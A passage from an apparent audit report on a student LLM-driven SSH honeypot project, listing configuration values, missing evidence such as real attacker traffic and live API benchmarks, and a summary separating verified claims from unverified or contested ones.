| LLM timeout | `LLM_TIMEOUT_SECONDS = 3.0` | [`honeypot/response_engine.py:37`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/response_engine.py#L37) |
| Fast-path standard jitter | `random.uniform(0.01, 0.05)` (10ms – 50ms) | [`honeypot/response_engine.py:292`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/response_engine.py#L292) |
| Fast-path slow command jitter | `random.uniform(0.05, 0.20)` (50ms – 200ms) | [`honeypot/response_engine.py:300`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/response_engine.py#L300) |
| Fallback command jitter | `random.uniform(0.05, 0.15)` (50ms – 150ms) | [`honeypot/response_engine.py:296`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/response_engine.py#L296) |
| AbuseIPDB request timeout | `2.0 seconds` | [`honeypot/ip_reputation.py:118`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/ip_reputation.py#L118) |
| AbuseIPDB score bonus (High) | `confidence_score >= 80` -> bonus `+25` | [`honeypot/ip_reputation.py:73`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/ip_reputation.py#L73) |
| AbuseIPDB score bonus (Medium) | `confidence_score >= 50` -> bonus `+15` | [`honeypot/ip_reputation.py:75`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/ip_reputation.py#L75) |
| AbuseIPDB score bonus (Low) | `confidence_score >= 20` -> bonus `+8` | [`honeypot/ip_reputation.py:77`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/ip_reputation.py#L77) |
| AbuseIPDB high report bonus | `total_reports >= 50` -> bonus `+5` | [`honeypot/ip_reputation.py:80`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/ip_reputation.py#L80) |
| Hosting / DC usage bonus | `usage_type == "Data Center/Web Hosting/Transit"` -> `+5` | [`honeypot/ip_reputation.py:84`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/ip_reputation.py#L84) |
| Max initial IP reputation bonus | `min(bonus, 25)` | [`honeypot/ip_reputation.py:86`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/ip_reputation.py#L86) |
| WebSocket broadcast interval | `2.0 seconds` | [`dashboard/app.py:686, 711`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/dashboard/app.py#L686) |
| Next.js frontend WS timeout | `2500ms` (falls back to local simulator) | [`lib/use-honeypot-data.ts:46`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/lib/use-honeypot-data.ts#L46) |
| Next.js simulator tick interval | `2000ms` | [`lib/use-honeypot-data.ts:34`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/lib/use-honeypot-data.ts#L34) |

---

## H. GAPS

The following items are missing from the codebase and would be required for a complete, production-grade empirical deployment:

1. **Absence of Real Internet Attacker Traffic:**
   - No empirical public honeypot dataset exists in the repository. All 6,836 log lines across 10 `honeypot.jsonl*` files originate from local automated test runs, demo sessions, and simulated scenario scripts.
2. **Empirical Cowrie Baseline Comparison:**
   - The comparison baseline of Cowrie passing 8/22 checks is hardcoded in Python (`fingerprint_checker.py:611-649`), not measured against a live, concurrent instance of Cowrie.
3. **Real LLM Latency, Cost, and Accuracy Benchmarks:**
   - No real API benchmarks exist measuring live network round-trip latency, token consumption, financial cost per session, or hallucination rates against actual Anthropic/Gemini/OpenAI APIs. All tests run in fallback or mock mode without keys.
4. **Cowrie Dispatcher & SessionManager Disconnect:**
   - The Cowrie dispatch layer (`cowrie_hook.py`) bypasses `SessionManager` and `ip_reputation.py`, using `SimpleSession` instead. AbuseIPDB IP reputation is never queried during live Cowrie command handling.
5. **Ethics Approval & Legal Compliance Documentation:**
   - The repo contains no IRB approval, institutional ethics declaration, or privacy review documentation concerning recording keystrokes and IP addresses from external attackers.
6. **Live VM Infrastructure State:**
   - No active server infrastructure, cloud-init manifests, or terraform configurations exist confirming an active, publicly exposed cloud honeypot instance.
7. **External Honeypot Comparative Benchmarking:**
   - No empirical comparison against other modern deception systems (e.g., Dionaea, Kippo, Conpot, or academic LLM honeypots).
8. **Formal Academic Bibliography:**
   - No `.bib` or formal reference bibliography file exists in the repository.

---

## 10-LINE VERIFIED SUMMARY

1. **Solid & Verified:** The fast-path dictionary cleanly covers 40 commands across 47 registered aliases with strict sub-50ms execution.
2. **Solid & Verified:** FakeFS and its 8 consistency rules are 100% verified across 124 cross-reference assertion tests.
3. **Solid & Verified:** The Threat Scorer's 143 exact-match entries, 45 binary fallbacks, 29 argument escalators, and 9 multi-command patterns execute accurately.
4. **Solid & Verified:** The Persona Switcher's gradual change queues (8 events for dev, 9 for finance) successfully drip subtle filesystem/process changes over 5 steps.
5. **Solid & Verified:** The ephemeral SessionOverlay reliably isolates in-memory file creation, editing, and deletion per session.
6. **Unverified:** The LLM slow-path performance against live APIs is completely unbenchmarked, as no real API keys were configured or used.
7. **Unverified:** The claimed Cowrie baseline score of 8/22 is entirely hardcoded in a lookup table, not empirically measured against Cowrie.
8. **Questioned by Reviewer #1:** **Zero Live Attacker Data** — All 6,836 log records are locally simulated; the system was never deployed on a public VM to collect real attack traffic.
9. **Questioned by Reviewer #2:** **Architectural Disconnect** — `cowrie_hook.py` bypasses `SessionManager` and `ip_reputation.py`, rendering AbuseIPDB threat scoring completely inactive in Cowrie sessions.
10. **Questioned by Reviewer #3:** **Conflicting Headline Metrics** — Documentation claims 22/22 and 19/22 fingerprint resistance, whereas the actual test suite measures 21/22 and fails `timing_simple_cmd` (1073.8ms vs < 200ms).
